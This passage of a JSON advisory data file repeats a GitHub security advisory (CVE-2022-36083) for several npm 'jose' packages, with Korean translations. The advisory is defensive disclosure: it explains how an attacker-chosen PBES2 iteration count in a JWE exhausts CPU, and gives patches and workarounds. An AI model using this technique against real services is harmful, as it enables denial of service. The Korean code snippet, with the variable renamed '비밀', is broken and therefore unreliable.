PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose-node-cjs-runtime",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, <= 4.9.1",
    "identifier": "4.9.2",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose-browser-runtime",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, <= 4.9.1",
    "identifier": "4.9.2",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, <= 4.9.1",
    "identifier": "4.9.2",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
    "description": "The PBKDF2-based JWE key management algorithms expect a JOSE Header Parameter named `p2c` ([PBES2 Count](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2)), which determines how many PBKDF2 iterations must be executed in order to derive a CEK wrapping key. The purpose of this parameter is to intentionally slow down the key derivation function in order to make password brute-force and dictionary attacks more expensive.\n\nThis makes the PBES2 algorithms unsuitable for situations where the JWE is coming from an untrusted source: an adversary can intentionally pick an extremely high PBES2 Count value, that will initiate a CPU-bound computation that may take an unreasonable amount of time to finish.\n\n### Impact\n\nUnder certain conditions (see below) it is possible to have the user's environment consume unreasonable amount of CPU time.\n\n### Affected users\n\nThe impact is limited only to users utilizing the JWE decryption APIs with symmetric secrets to decrypt JWEs from untrusted parties who do not limit the accepted JWE Key Management Algorithms (`alg` Header Parameter) using the `keyManagementAlgorithms` (or `algorithms` in v1.x) decryption option or through other means.\n\nThe PBKDF2-based JWE Key Management Algorithm Identifiers are\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\ne.g.\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // JWE from an untrusted party\n\nawait jose.compactDecrypt(jwe, secret)\n```\n\nYou are NOT affected if any of the following applies to you\n\n- Your code does not use the JWE APIs\n- Your code only produces JWE tokens\n- Your code only decrypts JWEs using an asymmetric JWE Key Management Algorithm (this means you're providing an asymmetric key object to the JWE decryption API)\n- Your code only accepts JWEs produced by trusted sources\n- Your code limits the accepted JWE Key Management Algorithms using the `keyManagementAlgorithms` decryption option not including any of the PBKDF2-based JWE key management algorithms\n\n### Patches\n\n`v1.28.2`, `v2.0.6`, `v3.20.4`, and `v4.9.2` releases limit the maximum PBKDF2 iteration count to `10000` by default. It is possible to adjust this limit with a newly introduced `maxPBES2Count` decryption option.\n\n### Workarounds\n\nAll users should be able to upgrade given all stable semver major release lines have had new a patch release introduced which limits the PBKDF2 iteration count to `10000` by default. This removes the ability to craft JWEs that would consume unreasonable amount of CPU time.\n\nIf users are unable to upgrade their required library version they have two options depending on whether they expect to receive JWEs using any of the three PBKDF2-based JWE key management algorithms.\n\n- they can use the `keyManagementAlgorithms` decryption option to disable accepting PBKDF2 altogether\n- they can inspect the JOSE Header prior to using the decryption API and limit the PBKDF2 iteration count (`p2c` Header Parameter)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an discussion in the project's [repository](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)\n* Email me at [panva.ip@gmail.com](mailto:panva.ip@gmail.com)\n",
    "identifiers": "GHSA : GHSA-jv3g-j58f-9mq9\nCVE : CVE-2022-36083",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T21:33:36Z",
    "publishedAt": "2022-09-16T17:44:42Z",
    "references": "https://github.com/panva/jose/security/advisories/GHSA-jv3g-j58f-9mq9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36083\nhttps://github.com/panva/jose/commit/03d6d013bf6e070e85adfe5731f526978e3e8e4d\nhttps://github.com/panva/jose/releases/tag/v4.9.2\nhttps://github.com/advisories/GHSA-jv3g-j58f-9mq9",
    "name": "jose",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, <= 3.20.3",
    "identifier": "3.20.4",
    "descriptionKR": "PBKDF2 기반 JWE 키 관리 알고리즘은 'p2c'([PBES2 개수](https://www.rfc-editor.org/rfc/rfc7518.html#section-4.8.1.2))라는 JOSE 헤더 매개변수를 예상합니다. CEK 래핑 키를 파생시키기 위해 실행해야 하는 PBKDF2 반복 횟수를 결정합니다. 이 매개변수의 목적은 의도적으로 키 파생 기능을 느리게 하여 암호 무차별 대입 공격과 사전 공격의 비용을 높이는 것입니다.\n\n이로 인해 PBES2 알고리즘은 JWE가 신뢰할 수 없는 소스에서 오는 상황에 부적합합니다. 공격자는 의도적으로 매우 높은 PBES2 카운트 값을 선택할 수 있으며, 이 값은 완료하는 데 비합리적인 시간이 걸릴 수 있는 CPU 바운드 계산을 시작합니다.\n\n### 영향\n\n특정 조건(아래 참조)에서 사용자 환경이 비합리적인 양의 CPU 시간을 소비하도록 할 수 있습니다.\n\n### 영향을 받는 사용자\n\n영향은 'keyManagementAlgorithms'(또는 v1의 'algorithms')를 사용하여 허용된 JWE 키 관리 알고리즘('alg' 헤더 매개변수)을 제한하지 않는 신뢰할 수 없는 당사자로부터 JWE를 해독하기 위해 대칭 비밀이 있는 JWE 암호 해독 API를 사용하는 사용자에게만 제한됩니다. .x) 암호 해독 옵션 또는 기타 수단을 통해.\n\nPBKDF2 기반 JWE 키 관리 알고리즘 식별자는 다음과 같습니다.\n\n- `PBES2-HS256+A128KW`\n- `PBES2-HS384+A192KW`\n- `PBES2-HS512+A256KW`\n\n예를 들어\n\n```js\nconst secret = new Uint8Array(16)\nconst jwe = '...' // 신뢰할 수 없는 당사자의 JWE\n\nawait jose.compactDecrypt(jwe, 비밀)\n```\n\n다음 중 하나라도 해당되는 경우 영향을 받지 않습니다.\n\n- 귀하의 코드는 JWE API를 사용하지 않습니다.\n- 귀하의 코드는 JWE 토큰만 생성합니다.\n- 귀하의 코드는 비대칭 JWE 키 관리 알고리즘을 사용하여 JWE만 해독합니다(즉, JWE 해독 API에 비대칭 키 객체를 제공한다는 의미입니다).\n- 귀하의 코드는 신뢰할 수 있는 소스에서 생성된 JWE만 허용합니다.\n- 귀하의 코드는 PBKDF2 기반 JWE 키 관리 알고리즘을 포함하지 않는 'keyManagementAlgorithms' 암호 해독 옵션을 사용하여 허용되는 JWE 키 관리 알고리즘을 제한합니다.\n\n### 패치\n\n`v1.28.2`, `v2.0.6`, `v3.20.4` 및 `v4.9.2` 릴리스는 기본적으로 최대 PBKDF2 반복 횟수를 `10000`으로 제한합니다. 새로 도입된 'maxPBES2Count' 복호화 옵션으로 이 제한을 조정할 수 있습니다.\n\n### 해결 방법\n\n모든 안정적인 semver 주요 릴리스 라인에 기본적으로 PBKDF2 반복 횟수를 '10000'으로 제한하는 새로운 패치 릴리스가 도입된 경우 모든 사용자가 업그레이드할 수 있어야 합니다. 이렇게 하면 부당한 양의 CPU 시간을 소비하는 JWE를 만드는 기능이 제거됩니다.\n\n사용자가 필요한 라이브러리 버전을 업그레이드할 수 없는 경우 세 가지 PBKDF2 기반 JWE 키 관리 알고리즘 중 하나를 사용하여 JWE를 수신할지 여부에 따라 두 가지 옵션이 있습니다.\n\n- `keyManagementAlgorithms` 암호 해독 옵션을 사용하여 PBKDF2 수락을 완전히 비활성화할 수 있습니다.\n- 암호 해독 API를 사용하기 전에 JOSE 헤더를 검사하고 PBKDF2 반복 횟수(`p2c` 헤더 매개변수)를 제한할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* 프로젝트의 [저장소](https://github.com/panva/jose/discussions/new?category=q-a&title=GHSA-jv3g-j58f-9mq9%20advisory%20question)에서 토론 열기\n* [panva.ip@gmail.com](mailto:panva.ip@gmail.com)으로 이메일을 보내주세요."
  },
  {
